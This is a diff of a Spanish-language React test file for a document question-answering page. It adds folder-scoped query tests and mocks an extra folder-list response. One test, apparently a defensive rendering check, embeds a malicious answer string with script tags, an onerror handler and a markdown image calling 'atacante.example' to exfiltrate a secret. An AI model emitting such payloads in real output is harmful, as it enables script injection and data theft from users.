@@ -1,7 +1,7 @@
 import { render, screen } from '@testing-library/react'
 import userEvent from '@testing-library/user-event'
 import { describe, expect, it } from 'vitest'
-import { makeDocument } from '../test/fixtures'
+import { makeDocument, makeFolder } from '../test/fixtures'
 import { jsonResponse, mockFetch } from '../test/mockFetch'
 import type { QueryResponse } from '../types/api'
 import { AskPage } from './AskPage'
@@ -30,7 +30,7 @@ describe('AskPage', () => {
       sources: [SOURCE],
       insufficient_evidence: false,
     }
-    const fetchSpy = mockFetch(jsonResponse(answer))
+    const fetchSpy = mockFetch(jsonResponse([]), jsonResponse(answer))
     render(<AskPage />)
 
     await ask('  ¿Cuántos días de vacaciones?  ')
@@ -46,13 +46,14 @@ describe('AskPage', () => {
     expect(pageLink).toHaveAttribute('rel', 'noopener noreferrer')
     expect(screen.getByText(SOURCE.excerpt)).toBeInTheDocument()
     // La pregunta se envía sin espacios sobrantes.
-    expect(JSON.parse(fetchSpy.mock.calls[0][1]?.body as string)).toEqual({
+    expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
       question: '¿Cuántos días de vacaciones?',
     })
   })
 
   it('identifica las fuentes que son el resumen de un documento', async () => {
     mockFetch(
+      jsonResponse([]),
       jsonResponse({
         answer: 'Es un manual de recursos humanos.',
         sources: [
@@ -78,6 +79,7 @@ describe('AskPage', () => {
 
   it('explica cuando no hay evidencia suficiente', async () => {
     mockFetch(
+      jsonResponse([]),
       jsonResponse({
         answer: 'No encontré información en los documentos disponibles.',
         sources: [],
@@ -93,7 +95,7 @@ describe('AskPage', () => {
   })
 
   it('muestra los errores del servidor de forma comprensible', async () => {
-    mockFetch(jsonResponse({ detail: 'El proveedor de LLM no tiene saldo.' }, 503))
+    mockFetch(jsonResponse([]), jsonResponse({ detail: 'El proveedor de LLM no tiene saldo.' }, 503))
     render(<AskPage />)
 
     await ask('hola')
@@ -102,6 +104,7 @@ describe('AskPage', () => {
   })
 
   it('no permite enviar una pregunta vacía', () => {
+    mockFetch(jsonResponse([]))
     render(<AskPage />)
 
     expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
@@ -112,7 +115,10 @@ describe('AskPage', () => {
     const malicious =
       'Respuesta <img src=x onerror="alert(1)"> <script>alert(2)</script> ' +
       '![x](https://atacante.example/robar?d=secreto)'
-    mockFetch(jsonResponse({ answer: malicious, sources: [SOURCE], insufficient_evidence: false }))
+    mockFetch(
+      jsonResponse([]),
+      jsonResponse({ answer: malicious, sources: [SOURCE], insufficient_evidence: false }),
+    )
     const { container } = render(<AskPage />)
 
     await ask('hola')
@@ -154,6 +160,32 @@ describe('AskPage', () => {
     render(<AskPage documentId="11111111-1111-4111-8111-111111111111" />)
 
     expect(await screen.findByRole('alert')).toHaveTextContent('El documento no existe.')
+    await userEvent.click(screen.getByLabelText('Pregunta'))
+    await userEvent.paste('¿Algo?')
+    expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
+  })
+
+  it('pregunta solo a una carpeta', async () => {
+    const folder = makeFolder({ name: 'RR. HH.', document_count: 2 })
+    const answer: QueryResponse = { answer: '22 días.', sources: [SOURCE], insufficient_evidence: false }
+    const fetchSpy = mockFetch(jsonResponse([folder]), jsonResponse(answer))
+    render(<AskPage />)
+
+    await userEvent.selectOptions(await screen.findByLabelText('Buscar en'), 'RR. HH. (2)')
+    await ask('¿Cuántos días de vacaciones?')
+
+    expect(await screen.findByText('22 días.')).toBeInTheDocument()
+    expect(JSON.parse(fetchSpy.mock.calls[1][1]?.body as string)).toEqual({
+      question: '¿Cuántos días de vacaciones?',
+      folder_id: folder.id,
+    })
+  })
+
+  it('preselecciona la carpeta del enlace y avisa si ya no existe', async () => {
+    mockFetch(jsonResponse([makeFolder()]))
+    render(<AskPage folderId="99999999-9999-4999-8999-999999999999" />)
+
+    expect(await screen.findByRole('alert')).toHaveTextContent('La carpeta no existe')
     await userEvent.click(screen.getByLabelText('Pregunta'))
     await userEvent.paste('¿Algo?')
     expect(screen.getByRole('button', { name: 'Preguntar' })).toBeDisabled()
